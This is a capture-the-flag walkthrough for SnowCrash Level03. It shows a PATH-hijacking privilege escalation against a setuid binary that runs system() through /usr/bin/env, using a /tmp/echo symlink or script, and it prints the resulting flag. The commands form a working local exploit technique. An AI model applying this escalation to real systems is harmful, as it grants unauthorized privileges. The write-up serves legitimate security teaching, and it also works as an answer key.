# SnowCrash Level03 Walkthrough

## Overview

Level03 focuses on binary exploitation through PATH manipulation and symbolic links. This level demonstrates how insecure system calls can be exploited to gain elevated privileges.

## Initial Investigation

Upon logging into the level03 user, we immediately find an executable file:

```bash
level03@SnowCrash:~$ ls -la
total 17
dr-xr-x---+ 1 level03 level03   120 Mar  5  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level03 level03   220 Apr  3  2012 .bash_logout
-r-x------  1 level03 level03  3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag03  level03  8627 Mar  5  2016 level03
-r-x------  1 level03 level03   675 Apr  3  2012 .profile
```

### Key Observations

- The `level03` binary has **setuid** and **setgid** bits set (`-rwsr-sr-x`)
- It's owned by `flag03` user, meaning it runs with flag03 privileges
- When executed, it simply outputs "Exploit me"

```bash
level03@SnowCrash:~$ ./level03
Exploit me
```

## Binary Analysis with ltrace

To understand what the binary does internally, we use `ltrace` to trace library calls:

> **ltrace** is a debugging tool that intercepts and records dynamic library calls made by a program, showing function calls, arguments, and return values.

```bash
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7a4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                        = 2003
geteuid()                                        = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++
```

### Critical Discovery

The binary makes a **vulnerable system call**:

```c
system("/usr/bin/env echo Exploit me");
```

This call uses `/usr/bin/env` to find the `echo` command in the system PATH, which creates an opportunity for PATH manipulation.

## Understanding the Target

Let's examine what we need to access:

```bash
level03@SnowCrash:~$ ls -la /bin/getflag
-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag
```

The `getflag` binary is owned by root, but when we try to execute it directly:

```bash
level03@SnowCrash:~$ getflag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

This suggests that `getflag` checks the effective user ID and only provides the real flag when run with appropriate privileges.

## Exploitation Strategy

The attack plan involves:

1. Creating a malicious `echo` command that executes `getflag`
2. Manipulating the PATH to make the system find our malicious `echo` first
3. Running the vulnerable binary to trigger the exploit

### Step 1: Create a Symbolic Link

Create a symbolic link in `/tmp` that points to `getflag`:

```bash
level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
```

### Step 2: Verify the Link

Test that our symbolic link works:

```bash
level03@SnowCrash:~$ /tmp/echo
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

This still shows the "Nope" message because we're not running with elevated privileges yet.

### Step 3: PATH Manipulation

Modify the PATH environment variable to prioritize `/tmp` over system directories:

```bash
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Or, for a more aggressive approach, set PATH to only include `/tmp`:

```bash
level03@SnowCrash:~$ export PATH=/tmp
level03@SnowCrash:~$ export | /bin/grep PATH
declare -x PATH="/tmp"
```

### Step 4: Execute the Exploit

Now when we run the vulnerable binary:

```bash
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## How the Exploit Works

1. **Vulnerable System Call**: The `level03` binary calls `system("/usr/bin/env echo Exploit me")`
2. **PATH Resolution**: `/usr/bin/env` searches the PATH for the `echo` command
3. **Malicious Echo**: Our modified PATH causes it to find `/tmp/echo` (our symbolic link to `getflag`)
4. **Privilege Escalation**: Since `level03` runs with `flag03` privileges (setuid), our symbolic link executes with those same privileges
5. **Flag Retrieval**: `getflag` runs with elevated privileges and returns the actual flag

## Security Implications

This level demonstrates several critical security vulnerabilities:

- **Insecure PATH Usage**: Using `system()` with relative paths
- **Setuid Binary Risks**: Combining setuid with system calls
- **Environment Variable Injection**: Allowing user-controlled environment variables to affect privileged operations

## Alternative Approaches

Instead of a symbolic link, you could also create a script:

```bash
#!/bin/bash
/bin/getflag
```

Save this as `/tmp/echo`, make it executable with `chmod +x /tmp/echo`, and follow the same PATH manipulation steps.

## Flag

```
qi0maab88jeaj46qoumi7maus
```

This flag allows access to the next level of the SnowCrash challenge.

## Key Learnings

1. **PATH Manipulation**: Understanding how system PATH resolution works
2. **Setuid Vulnerabilities**: How setuid binaries can be exploited through environment variables
3. **System Call Security**: The dangers of using `system()` with user-controllable input
4. **Binary Analysis**: Using tools like `ltrace` to understand program behavior
5. **Privilege Escalation**: Leveraging existing privileges to gain higher access levels
